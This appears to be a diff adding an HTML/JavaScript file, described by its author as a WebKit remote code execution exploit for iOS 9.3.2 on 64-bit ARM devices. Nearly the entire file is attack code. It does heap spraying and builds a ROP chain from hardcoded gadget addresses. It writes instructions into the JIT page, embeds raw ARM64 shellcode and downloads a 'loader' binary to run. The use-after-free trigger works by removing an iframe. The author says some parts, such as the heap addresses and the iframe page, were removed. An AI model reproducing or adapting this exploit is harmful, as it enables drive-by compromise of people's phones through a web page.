@@ -1,0 +1,286 @@
+<!-- 
+
+
+	KimJongCracks WE OUT HERE // iOS 9.3.2 RCE for AArch64 devices // no infoleaks // no kernel exploit / sb bypass // crappiest exploit ever 
+	
+	Quick and dirty exploit. Some stuff has been removed, so it probably won't work 1:1. The frame src for instance is not included, but it's just slightly modified from WK's testcase for heapPopMin.
+	Do your own homework.
+	
+
+-->
+
+<html>
+    <head>
+        <script>
+            var count = 0;
+            </script>
+    </head>
+    <body onload='deleteFrame()'>
+        <script>
+            window.m_references = [];
+            
+            var buf = new ArrayBuffer(0x10000);
+            var arr = new Uint32Array(buf);
+            
+            
+            function spray(sz, kspray) {
+                var ref=new Array(kspray);
+                for(var i = 0; i < kspray; i++) {
+                    ref[i] = new ArrayBuffer(sz);
+                }
+                for(var i = 0; i < kspray; i++) {
+                    var view = new Uint32Array(ref[i]);
+                    for(var k = 0; k < (sz)/4; k++) {
+                        view[k] = arr[k];
+                    }
+                }
+                window.m_references.push(ref);
+            }
+
+
+        var fixup_slide = 0x1c58000;
+        var longjmp = 0x8069df9c+fixup_slide;
+        var libdispatch_hook = 0x9e27c408+fixup_slide;
+        var br_x0 = 0x80a0b76c+fixup_slide;
+        var ldp_x29x30_ret = 0x81326428+fixup_slide;
+        var mov_x1x19_blr_x20 = 0x80920674+fixup_slide;
+        var mov_x0x20_blr_x22 = 0x8135052c+fixup_slide;
+        var jitPage_ptr = 0x9d65ced0+fixup_slide;
+        var ldp_x29x30x20x19x22x21_ret = 0x840c207c+fixup_slide;
+        var ldr_x0_x0_16_ldp_x29_x30_ret= 0x81387318+fixup_slide;
+        var decrement_x0_ldp2930ret = 0x80aa34ec+fixup_slide;
+        var str_x19_x0_48_ldpx29x30x20x19_ret = 0x80978c1c+fixup_slide;//x843f0c1c; //827df4ec;
+
+        for(var k = 0x0/4; k < 0x10000/4; ) {
+            arr[k++] = 0x55555555; // ldp x29,x30,ret <- x30
+            arr[k++] = 0x1;
+            arr[k++] = ldp_x29x30_ret; // ldp x29,x30,ret <- x30
+            arr[k++] = 0x1;
+        }
+
+        var chain = 0x0;
+
+        var heapaddr = /* enter heap alloc 1 address here */;
+        var heapaddr_stack = /* enter heap alloc 2 address here*/;
+
+        function pushGadget(x,y) {
+            arr[chain++] = x;
+            arr[chain++] = y;
+        }
+        
+        function loadHighRegs(x19,x20,x21,x22) {
+            pushGadget(0x41414141,1)
+            pushGadget(ldp_x29x30x20x19x22x21_ret, 1);
+            pushGadget(x22,1)
+            pushGadget(x21,1)
+            pushGadget(x20,1)
+            pushGadget(x19,1)
+        }
+        function loadHighRegsFull(x19,x19h,x20,x20h,x21,x21h,x22,x22h) {
+            pushGadget(0x41414141,1)
+            pushGadget(ldp_x29x30x20x19x22x21_ret, 1);
+            pushGadget(x22,x22h)
+            pushGadget(x21,x21h)
+            pushGadget(x20,x20h)
+            pushGadget(x19,x19h)
+        }
+        
+        function derefX0(ptr) {
+            loadHighRegs(0, ptr-16, 0, ldp_x29x30_ret);
+            
+            pushGadget(0x41414141,1)
+            pushGadget(mov_x0x20_blr_x22, 1);
+            
+            pushGadget(0x41414141,1)
+            pushGadget(ldr_x0_x0_16_ldp_x29_x30_ret, 1);
+        }
+        function loadX0(val) {
+            loadHighRegs(0, val, 0, ldp_x29x30_ret);
+            pushGadget(0x41414141,1)
+            pushGadget(mov_x0x20_blr_x22, 1);
+        }
+        function jumpX0() {
+            pushGadget(0x41414141,1)
+            pushGadget(br_x0, 0x1);
+        }
+        
+        
+        function decrementX0() {
+            pushGadget(0x41414141,1)
+            pushGadget(decrement_x0_ldp2930ret, 1);
+        }
+        
+        function write8(hi,lo) {
+            loadHighRegsFull(lo,hi,0,0,0,0,0)
+            pushGadget(0x41414141,1)
+            pushGadget(str_x19_x0_48_ldpx29x30x20x19_ret,1)
+            pushGadget(0x41414141,1)
+            pushGadget(0x41414141,1)
+            decrementX0()
+            decrementX0()
+            decrementX0()
+            decrementX0()
+            decrementX0()
+            decrementX0()
+            decrementX0()
+            decrementX0()
+        }
+        
+        derefX0(jitPage_ptr)
+        
+        write8(0xd65f03c0, 0xa8c17bfd)
+        
+        write8(0x54ffffa1, 0x6b0600bf) // movz / b.ne
+        
+        write8(0xb80044e6, 0xb8404506) // cmp / str
+        write8(0x54ffffc1, 0x6b0600bf) // ldr / bne
+        write8(0xb8404506, 0x910003e8) // cmp / ldr
+        write8(0x72ad2d25, 0x528d2d25) // mov / movk
+        
+        write8(0xa9001fe0, 0x90000107) // movz / adr
+        /*
+         write8(0xd4004001, 0xd2b00010) // movz / svc
+         write8(0xd2800008, 0x54ffffa1) // movz / b.ne
+         write8(0x6b0600bf, 0xb80044e6) // cmp / str
+         write8(0xb8404506, 0x54ffffc1) // ldr / bne
+         write8(0x6b0600bf, 0xb8404506) // cmp / ldr
+         write8(0x910003e8, 0x72ad2d25) // mov / movk
+         write8(0x528d2d25, 0x100001c7) // movz / adr
+         */
+        
+        loadX0(libdispatch_hook-48)
+        write8(0,0)
+        
+        
+        loadHighRegsFull(0x10000,0,ldp_x29x30_ret,1,0,0,0,0)
+        pushGadget(0x41414141,1)
+        pushGadget(mov_x1x19_blr_x20, 1);
+        
+        derefX0(jitPage_ptr)
+        
+        
+        jumpX0()
+        
+        spray(0x10000, 256)
+        
+        
+        var shellcode = new ArrayBuffer(0x10000);
+        var sh_view = new Uint32Array(shellcode);
+        sh_view[0] = 0x505050504;
+        
+        for(var k = 0x0/4; k < 0x10000/4; ) {
+            arr[k++] = heapaddr;
+            arr[k++] = 0x1;
+            arr[k++] = longjmp;
+            arr[k++] = 0x1;
+        }
+        
+        spray(0x10000, 2048)
+        
+        
+        for(var k = 0; k < 0x10000/4; ) {
+            arr[k++] = heapaddr;
+            arr[k++] = 0x1;
+        }
+        
+        spray(0x10000, 256)
+        
+        arr[0x7c] = ldp_x29x30_ret; // lr, we jump into this
+        arr[0x7d] = 0x1;
+        
+        arr[0x80] = heapaddr_stack; // sp
+        arr[0x81] = 0x1;
+        
+        var shc = 0;
+        sh_view[shc++] = 0x69696969;
+        sh_view[shc++] = 0xd503201f;
+        sh_view[shc++] = 0xd503201f;
+        sh_view[shc++] = 0x94000018;
+        sh_view[shc++] = 0xaa0103f5;
+        sh_view[shc++] = 0xd2c00254;
+        sh_view[shc++] = 0xd344fe94;
+        sh_view[shc++] = 0xaa1403e0;
+        sh_view[shc++] = 0x94000016;
+        sh_view[shc++] = 0xf100041f;
+        sh_view[shc++] = 0x540000a1;
+        sh_view[shc++] = 0xf9400280;
+        sh_view[shc++] = 0xd29f59e1;
+        sh_view[shc++] = 0xf2bfdda1;
+        sh_view[shc++] = 0x6b01001f;
+        sh_view[shc++] = 0x91400694;
+        sh_view[shc++] = 0x54fffee1;
+        sh_view[shc++] = 0xb0000000;
+        sh_view[shc++] = 0xd2800021;
+        sh_view[shc++] = 0x910103e2;
+        sh_view[shc++] = 0xd28d6f03;
+        sh_view[shc++] = 0xf9000043;
+        sh_view[shc++] = 0xa90007e0;
+        sh_view[shc++] = 0xa9017fe2;
+        sh_view[shc++] = 0xa9027fe2;
+        sh_view[shc++] = 0xa9037fe2;
+        sh_view[shc++] = 0xd61f0280;
+        sh_view[shc++] = 0xd2800550;
+        sh_view[shc++] = 0xd4001001;
+        sh_view[shc++] = 0xd65f03c0;
+        sh_view[shc++] = 0xaa0003e1;
+        sh_view[shc++] = 0xaa1503e0;
+        sh_view[shc++] = 0xd2800022;
+        sh_view[shc++] = 0xd2800090;
+        sh_view[shc++] = 0xd4001001;
+        sh_view[shc++] = 0xd65f03c0;
+        
+        var stop = 0;
+        function load_binary_resource(url) {
+            var req = new XMLHttpRequest();
+            req.open('GET', url, false);
+            req.overrideMimeType('text\/plain; charset=x-user-defined');
+            req.send(null);
+            if (req.status != 200) {document.write("fail downloading loader");stop=1};
+            return req.responseText;
+        }
+        
+        var filestream = load_binary_resource("loader?" + Math.random())
+        
+        shc = 4096/4;
+        shc -= 52/4;
+        
+        for(var i = 0; i < filestream.length; )
+        {
+            var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
+            sh_view[shc++] = word;
+            i+=4;
+        }
+        
+        
+        window.f = 0;
+        //      sh_view[shc++] = 0x69696969;
+        function deleteFrame()
+        {
+            if(window.f == 1&& stop == 1) return;
+            var frameToRemove = document.getElementById('subframe');
+            document.body.removeChild(frameToRemove);
+            if(stop == 1) return;
+            if (window.f == 1) {
+                var x=function() { spray(0x468,1024); };
+                setTimeout(x,0);
+                spray(0x468, 1024);
+            }
+        }
+        function reloadSubframe()
+        {
+            if(stop == 1) return;
+            var iframe = document.createElement('iframe');
+            iframe.id = 'subframe';
+            iframe.src = 'crash-during-iframe-load-stop.html';
+            document.body.appendChild(iframe);
+            setTimeout(function() { deleteFrame(); }, 0);
+        }
+        function subFrameFinishedLoading()
+        {
+            window.location.reload()
+        }
+        </script>
+        <h1>wkloader</h1><h2>i'm into ur heapz, gaining code exec n shit</h2>
+        <iframe id="subframe" src="crash-during-iframe-load-stop.html" style="border-width:0;opacity:0.01"> </iframe>
+    </body>
+</html>
